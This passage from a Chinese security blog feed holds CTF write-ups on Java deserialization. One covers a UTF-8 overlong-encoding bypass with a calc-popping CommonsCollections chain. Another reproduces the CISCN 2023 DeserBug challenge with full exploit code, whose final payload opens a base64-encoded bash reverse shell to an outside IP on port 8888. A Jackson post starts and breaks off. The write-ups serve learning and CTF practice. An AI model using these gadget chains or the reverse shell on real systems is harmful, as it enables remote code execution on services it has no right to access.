java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//这里待会调用的时候会在mpa新增加一个键值对aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br><span class="hljs-comment">//        serialize(hashMap);</span><br><span class="hljs-comment">//        serialize1(hashMap);</span><br><span class="hljs-comment">//        serialize2(hashMap);</span><br>        unserialize(<span class="hljs-string">&quot;ser2.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        CustomObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<span class="hljs-comment">//用重写过的ObjectOutputStream来序列化</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//正常序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize1</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser1.bin&quot;</span>));<span class="hljs-comment">//用重写过的ObjectOutputStream来序列化</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//重写writeUTF的序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize2</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        UTF8OutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser2.bin&quot;</span>));<span class="hljs-comment">//用重写过的ObjectOutputStream来序列化</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以去看一下使用前后字节流的变化</p><p><img src="https://cdn.clown2024.cn/image-20241022221131584.png" alt="image-20241022221131584"></p><p><img src="https://cdn.clown2024.cn/image-20241022221119279.png" alt="image-20241022221119279"></p><p>可以看到也是成功变成不可读的类名了,反序列化也是能正常弹计算器的</p><p><img src="https://cdn.clown2024.cn/image-20241022221255341.png" alt="image-20241022221255341"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/13932?accounttraceid=6f1030b220f8464eb2815f87796f4570daql&time__1311=eqRxyDcGG=k8D/D0D5IheGuDYwe=jDQwhD&alichlgref=https://account.aliyun.com/&u_atoken=569ca1e0aebe29a9b429829147e2aae3&u_asig=0a472f9217296064164077608e011c">java原生反序列化OverlongEncoding分析及实战 - 先知社区</a></p><p><a href="https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg">UTF-8 Overlong Encoding导致的安全问题</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前只是浅浅的知道这个东西，现在来深入学习一下，因为在java题目中有时会用到该方法来进行绕过&lt;/p&gt;
&lt;h1 id=&quot;utf-8编码过程&quot;&gt;&lt;a href=&quot;#UTF-8编码过程&quot; class=&quot;headerlink&quot; title=&quot;UTF-8编码过程&quot;&gt;&lt;/a&gt;UTF-</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2023国赛DeserBug复现</title>
    <link href="https://clowsman.github.io/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-10-15T08:27:33.000Z</published>
    <updated>2024-10-26T08:15:55.801Z</updated>
    
    <content type="html"><![CDATA[<p>虽说题目不是很难，但是由于java题目做的还不是很多不太熟悉，而且java基础不牢，导致一些点让我思考了很久，这里记录一下</p><h1 id="deserbug题目"><a href="#DeserBug题目" class="headerlink" title="DeserBug题目"></a>DeserBug题目</h1><p>jadx反编译源码</p><p><img src="https://cdn.clown2024.cn/202410151633485.png" alt="image-20241015163331429"></p><p>Testapp这里，直接根目录传一个bugstr参数，然后将内容base64解码后反序列化</p><p>Myexpect是一个异常类，没看出有什么特别的地方</p><p>然后题目附件还给了两个包commons-collections-3.2.2.jar，hutool-all-5.8.18.jar</p><p><img src="https://cdn.clown2024.cn/202410151633951.png" alt="image-20241015163239379"></p><p>特意给了一个3.2.2是为什么呢，查了一下commons-collections从3.2.2版本开始尝试序列化或反序列化InvokerTransformer类都会抛出UnsupportedOperationException异常</p><blockquote><p>且该版本在一些危险的Transformer实现类的readObject前加上了FunctorUtils#checkUnsafeSerialization来检测反序列化是否安全。</p></blockquote><p>然后没什么思路了，去看wp当时题目还给了两个提示</p><blockquote><ol><li>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</li><li>jdk8u202(这个本地测试没什么影响)</li></ol></blockquote><p>我就说那个特地写的Myexpect类怎么会没用（</p><p>估计这中间就是给了一段链子的提示不用自己挖</p><p>我们现在就根据提示去看一下他的方法，这里本地工程导入他给的jar包来看</p><p>看到com.app.Myexpect#getAnyexcept</p><p><img src="https://cdn.clown2024.cn/202410151634172.png" alt="image-20241015163448121"></p><p>这里有个newInstance，应该就是最后要执行的地方，就可以用到TemplatesImpl的链子</p><p>emmm Hutool没找出来利用链，打了个cc3试了一下</p><p><img src="https://cdn.clown2024.cn/202410151635530.png" alt="image-20241015163503477"></p><p>InstantiateTransformer这个类也用不了，不会了看wp了</p><p>wp文章：<a href="https://blog.csdn.net/uuzeray/article/details/136748656">https://blog.csdn.net/uuzeray/article/details/136748656</a></p><p>看了之后发现其实是有点合理猜测的思路在里面，并没有完全调试，这也是和java的特性有关</p><p>去看JSONObject</p><p><img src="https://cdn.clown2024.cn/202410151635818.png" alt="image-20241015163529771"></p><p>可以知道他是一个map，他的put方法就相当于是map.put</p><p>那put方法又该怎么样调用呢，我们的lazyMap#get是可以调用put方法的</p><p><img src="https://cdn.clown2024.cn/202410151635507.png" alt="image-20241015163539460"></p><p>如果key不存在他就会调用put方法，令我们的map为JSONObject即可，然后JSONObject因为是map，我们存入的value是object的话，他就会需要获取对象相关属性信息，那怎么获取，应该就是需要通过getter方法，所以就触发了我们的getAnyexcept方法</p><p>所以我们可以走cc5的BadAttributeValueExpException那条链子到lazyMap#get的那部分，然后再拼上JSONObject的那部分链子</p><p>最终链子如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject --&gt; TiedMapEntry#toString --&gt; LazyMap#get --&gt; JSONObject#put --&gt; Myexpect#getAnyexcept --&gt; 触发恶意类<br></code></pre></td></tr></table></figure><h2 id="开始出错"><a href="#开始出错" class="headerlink" title="开始出错"></a>开始出错</h2><p>第一次自己写我是想直接将恶意类放到Myexpect上来触发的，但是他并不行，后来发现是我javassist写错了</p><p>第一次exp(但是远程不通，其实本地也通不了😅)</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> clazz.toClass();<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        setValue(myexpect,<span class="hljs-string">&quot;targetclass&quot;</span>,aClass); <span class="hljs-comment">//设置targetClass为恶意类</span><br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5部分</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;aaa&quot;</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//反射修改val属性</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//生成base64序列化数据</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//一定要记得url编码不然打不通</span><br><br><span class="hljs-comment">//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArray);</span><br><span class="hljs-comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="hljs-comment">//        objectInputStream.readObject();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在就遇上一个非常奇怪的问题了，他现在在序列化的时候会弹计算器，反序列化的时候不会，但是当我在本地把序列化出来的字符串拿出来反序列化的时候他又能弹了再当我去打远程的时候他打不通，只回显一个</p><p><img src="https://cdn.clown2024.cn/202410151636267.png" alt="image-20241015163624227"></p><p>后来又发现上面的的lazyMap也写错了，应该是这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Map lazyMap = LazyMap.decorate(jsonObject, new ConstantTransformer(myexpect));<br></code></pre></td></tr></table></figure><p>因为这样才能保证我们put进去的value是Myexpect类，因为<strong>ConstantTransformer</strong>这个类的transform返回的就是本身（太久没看cc链有点忘了</p><p>但还是通不了，会给我报错ClassNotFound的错误</p><p>我十分地不理解，理论上Myexpect能在反序列化执行newInstance，那我直接执行恶意类的newInstance不就好了，并不需要去再打cc3后面一整个部分，但是他就是不行，我也没找出来问题在哪</p><h2 id="找到原因"><a href="#找到原因" class="headerlink" title="找到原因"></a>找到原因</h2><p>哦cao调了半天，我去看了一下调用栈终于发现问题了</p><p><img src="https://cdn.clown2024.cn/202410151636181.png" alt="image-20241015163634114"></p><p><img src="https://cdn.clown2024.cn/202410151636869.png" alt="image-20241015163641816"></p><p><img src="https://cdn.clown2024.cn/202410151636685.png" alt="image-20241015163650638"></p><p>还是基础不牢的原因啊😭</p><p>下面根据上面的图说一下我自己的理解，对java类加载又清晰了一些</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">首先执行newInstance的话需要走整个类加载的流程<br>然后会先去找全类名<br>因为没有这个类所以在ClassForName途中就会报错<br>而defineClass直接从字节码向jvm注册这个类直接跳过了前面的步骤<br>所以要执行TemplatesImpl的defineClass才行<br></code></pre></td></tr></table></figure><p>下面写一下能通的exp吧，就是封装TrAXFilter来打TemplatesImpl</p><p>exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTA3LjIxMy84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templates &#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5部分</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(myexpect));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//反射修改val属性</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//生成base64序列化数据</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//一定要记得url编码不然打不通</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410151637073.png" alt="image-20241015163705024"></p><p><img src="https://cdn.clown2024.cn/202410151637818.png" alt="image-20241015163713767"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽说题目不是很难，但是由于java题目做的还不是很多不太熟悉，而且java基础不牢，导致一些点让我思考了很久，这里记录一下&lt;/p&gt;
&lt;h1 id=&quot;deserbug题目&quot;&gt;&lt;a href=&quot;#DeserBug题目&quot; class=&quot;headerlink&quot; title=&quot;Des</summary>
      
    
    
    
    <category term="题目复现" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson原生反序列化</title>
    <link href="https://clowsman.github.io/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-12T13:58:39.000Z</published>
    <updated>2024-11-02T16:20:31.642Z</updated>
    
    <content type="html"><![CDATA[<p>参考文章：<a href="https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&u_asig=1a0c381017287414696367848e00f7">https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&amp;u_asig=1a0c381017287414696367848e00f7</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Jackson的原生反序列化主要是为了触发任意getter方法调用链子，类似fastjson原生反序列化触发getter那样</p><h1 id="getter触发流程"><a href="#getter触发流程" class="headerlink" title="getter触发流程"></a>getter触发流程</h1><p>既然要调用任意getter方法，那我们就要触发getter方法的流程</p><p>Jackson触发getter是在<strong>ObjectMapper#writeValueAsString</strong>方法执行的时候</p><p>打个断点跟踪一下</p><p><img src="https://cdn.clown2024.cn/202410130102864.png" alt="image-20241013010248819"></p><p>这里说几个关键方法</p><p>先走到DefaultSerializerProvider#serializeValue方法</p><p><img src="https://cdn.clown2024.cn/202410130106024.png" alt="image-20241013010627975"></p><p>这里获取一个序列化器，我们传入了POJO对象，所以返回一个BeanSerializer</p><p>然后去到BeanSerializer#serialize方法</p><p><img src="https://cdn.clown2024.cn/202410130110595.png" alt="image-20241013011008553"></p><p>writeStartObject和writeEndObject就是分别在首尾写上’{‘和’}’</p><p>调用getter方法就在serializeFields方法里面</p><p><img src="https://cdn.clown2024.cn/202410130112193.png" alt="image-20241013011227152"></p><p>在serializeAsField方法里面这个地方调用了getter方法</p><p><img src="https://cdn.clown2024.cn/202410130117833.png" 